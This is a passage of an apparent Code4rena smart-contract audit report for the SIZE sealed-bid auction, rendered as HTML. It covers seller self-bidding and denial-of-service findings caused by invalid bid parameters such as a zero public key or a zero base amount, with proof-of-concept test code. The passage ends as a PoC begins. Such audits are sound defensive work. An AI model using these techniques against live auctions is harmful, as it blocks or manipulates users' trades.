class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">sellerIncreases</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">//seller&#39;s altnerate wallet</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">bidder3</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setAuctionId</span><span class=\"mtk1\">(</span><span class=\"mtk12\">aid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">bidder3</span><span class=\"mtk1\">.</span><span class=\"mtk11\">bidOnAuctionWithSalt</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2e6</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;seller&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">bidIndices</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">3</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">bidIndices</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">bidIndices</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">2</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">bidIndices</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">expectedClearingPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">2e6</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }          </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">endTime</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">seller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">finalize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bidIndices</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk12\">expectedClearingPrice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">AuctionData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAuctionData</span><span class=\"mtk1\">(</span><span class=\"mtk12\">aid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_named_uint</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;lowestBase&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">data</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lowestBase</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_named_uint</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;lowestQuote&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">data</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lowestQuote</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>A possible mitigation would be to introduce a 2 step reveal where the bidders also encrypt their bid with their own private key and only reveal their key after the seller has revealed theirs.\nThis would however create another attack vector where bidders try and game the auction and only reveal their bid(s) when and if the result would be in their best interest.\nThis in turn could be mitigated by bidders losing (part of) their quote tokens when not revealing their bids.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/170#issuecomment-1309013040\">0xean (judge) commented on duplicate issue #170</a>:</strong></p>\n<blockquote>\n<p>Not sure that wash trading qualifies as H risk as its not very unique to this system and is a risk in many defi trading applications. Will leave open as M for sponsor comment.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/170#issuecomment-1316099720\">Ragepit (sponsor) marked duplicate issue #170 as acknowledged and commented</a>:</strong> </p>\n<blockquote>\n<p>We’ve accepted this risk that a seller can bid on their own auction and make the clearing price higher because they are trusted to know the bid prices. The % profit may go up but the sold tokens will go down so there’s a trade-off for the seller.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-06-attacker-may-dos-auctions-using-invalid-bid-parameters\" style=\"position:relative;\"><a href=\"#m-06-attacker-may-dos-auctions-using-invalid-bid-parameters\" aria-label=\"m 06 attacker may dos auctions using invalid bid parameters permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/237\">[M-06] Attacker may DOS auctions using invalid bid parameters</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/237\">Trust</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/233\">_141345_</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/43\">0x1f8b</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/11\">0xdapper</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/197\">c7e7eff</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/78\">chaduke</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/107\">codexploder</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/207\">corerouter</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/263\">cryptonue</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/68\">fs0c</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/275\">gz627</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/126\">HE1M</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/118\">hihen</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/130\">joestakey</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/201\">KIntern_NA</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/85\">ktg</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/21\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/64\">Lambda</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/219\">minhtrng</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/123\">Picodes</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/44\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/236\">RedOneN</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/180\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/325\">simon135</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/13\">skyle</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/163\">slowmoses</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/208\">TomJ</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/330\">V_B</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/225\">wagmi</a>, and <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/102\">yixxas</a>.</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L258-L263\">https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L258-L263</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L157-L159\">https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L157-L159</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L269-L280\">https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L269-L280</a></p>\n<p>Buyers submit bids to SIZE using the bid() function. There’s a max of 1000 bids allowed per auction in order to stop DOS attacks (Otherwise it could become too costly to execute the finalize loop). However, setting a max on number of bids opens up other DOS attacks.</p>\n<p>In the finalize loop this code is used:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">ECCMath.Point memory sharedPoint = ECCMath.ecMul(b.pubKey, sellerPriv);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// If the bidder public key isn&#39;t on the bn128 curve</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">if (sharedPoint.x == 1 &amp;&amp; sharedPoint.y == 1) continue;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">bytes32 decryptedMessage = ECCMath.decryptMessage(sharedPoint, b.encryptedMessage);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// If the bidder didn&#39;t faithfully submit commitment or pubkey</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// Or the bid was cancelled</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">if (computeCommitment(decryptedMessage) != b.commitment) continue;</span></span></code></pre>\n<p>Note that pubKey is never validated. Therefore, attacker may pass pubKey = (0,0).\nIn ecMul, the code will return (1,1):\n<code>if (scalar == 0 || (point.x == 0 &#x26;&#x26; point.y == 0)) return Point(1, 1);</code>\nAs a result, we enter the continue block and the bid is ignored. Later, the bidder may receive their quote amount back using refund().</p>\n<p>Another way to reach <code>continue</code> is by passing a 0 commitment.</p>\n<p>One last way to force the auction to reject a bid is a low quotePerBase:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">uint256 quotePerBase = FixedPointMathLib.mulDivDown(b.quoteAmount, type(uint128).max, baseAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// Only fill if above reserve price</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">if (quotePerBase &lt; data.reserveQuotePerBase) continue;</span></span></code></pre>\n<p>baseAmount is not validated as it is encrypted to seller’s public key. Therefore, buyer may pass baseAmount = 0, making quotePerBase = 0.</p>\n<p>So, attacker may submit 1000 invalid bids and completely DOS the auction.</p>\n<h3 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Attacker may DOS auctions using invalid bid parameters.</p>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Implement a slashing mechanism. If the bid cannot be executed due to user’s fault, some % their submitted quote tokens will go to the protocol and auction creator.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/237#issuecomment-1308875345\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>leaving open for sponsor review, issue is somewhat similar to the baseAmount 0 revert, but is unique enough to stand alone. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/237#issuecomment-1331289059\">RagePit (SIZE) commented</a>:</strong></p>\n<blockquote>\n<p>While possibly an issue in extreme cases, we implemented the <code>minimumBidQuote</code> for this reason. As anyone looking to DOS this way would have to lockup <code>minimumBidQuote*1000</code> tokens for the duration of the auction</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/237#issuecomment-1331295562\">RagePit (SIZE) commented</a>:</strong></p>\n<blockquote>\n<p>Separate from the unintended <code>#64</code> issue where the DOS would require no funds locked</p>\n</blockquote>\n<hr>\n<h2 id=\"m-07-denial-of-service-when-baseamount-is-equal-to-zero\" style=\"position:relative;\"><a href=\"#m-07-denial-of-service-when-baseamount-is-equal-to-zero\" aria-label=\"m 07 denial of service when baseamount is equal to zero permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/332\">[M-07] Denial of service when <code>baseAmount</code> is equal to zero</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/332\">V_B</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/42\">0x1f8b</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/18\">cccz</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/93\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/196\">ktg</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/115\">M4TZ1P</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/209\">neumo</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/165\">zapaz</a>, and <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/332\">V_B</a>.</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L217\">https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L217</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L269\">https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L269</a><br>\n<a href=\"https://github.com/transmissions11/solmate/blob/main/src/utils/FixedPointMathLib.sol#L44\">https://github.com/transmissions11/solmate/blob/main/src/utils/FixedPointMathLib.sol#L44</a></p>\n<p>There is a <code>finalize</code> function in the <code>SizeSealed</code> smart contract. The function traverses the array of the bids sorted by price descending. On each iteration, it <a href=\"https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L269\">calculates the <code>quotePerBase</code></a>. When this variable is calculated, the whole transaction may be reverted due to the internal logic of the calculation.</p>\n<p>Here is a part of the logic on the cycle iteration:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">decryptedMessage</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ECCMath</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decryptMessage</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sharedPoint</span><span class=\"mtk1\">, </span><span class=\"mtk12\">b</span><span class=\"mtk1\">.</span><span class=\"mtk12\">encryptedMessage</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// If the bidder didn&#39;t faithfully submit commitment or pubkey</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Or the bid was cancelled</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">computeCommitment</span><span class=\"mtk1\">(</span><span class=\"mtk12\">decryptedMessage</span><span class=\"mtk1\">) != </span><span class=\"mtk12\">b</span><span class=\"mtk1\">.</span><span class=\"mtk12\">commitment</span><span class=\"mtk1\">) </span><span class=\"mtk15\">continue</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// First 128 bits are the base amount, last are random salt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">decryptedMessage</span><span class=\"mtk1\"> &gt;&gt; </span><span class=\"mtk7\">128</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Require that bids are passed in descending price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">quotePerBase</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">FixedPointMathLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDivDown</span><span class=\"mtk1\">(</span><span class=\"mtk12\">b</span><span class=\"mtk1\">.</span><span class=\"mtk12\">quoteAmount</span><span class=\"mtk1\">, </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint128</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">, </span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Let’s <code>baseAmount == 0</code>, then</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">quotePerBase</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">FixedPointMathLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDivDown</span><span class=\"mtk1\">(</span><span class=\"mtk12\">b</span><span class=\"mtk1\">.</span><span class=\"mtk12\">quoteAmount</span><span class=\"mtk1\">, </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint128</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>According to the implementation of the <code>FixedPointMathLib.mulDivDown</code>, the transaction will be reverted.</p>\n<h3 id=\"attack-scenario\" style=\"position:relative;\"><a href=\"#attack-scenario\" aria-label=\"attack scenario permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Attack scenario</h3>\n<p>A mallicious user may encrypt the message with <code>baseAmount == 0</code>, then the auction is impossible to <code>finalize</code>.</p>\n<h3 id=\"impact-3\" style=\"position:relative;\"><a href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Any user can make a griffering attack to invalidate the auction.</p>\n<h3 id=\"poc\" style=\"position:relative;\"><a href=\"#poc\" aria-label=\"poc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PoC</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: MIT OR Apache-2.0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> =</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">17</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">experimental</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ABIEncoderV2</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">SizeSealed</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;SizeSealed.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">ISizeSealed</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;interfaces/ISizeSealed.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">ECCMath</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;util/ECCMath.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MintableERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span 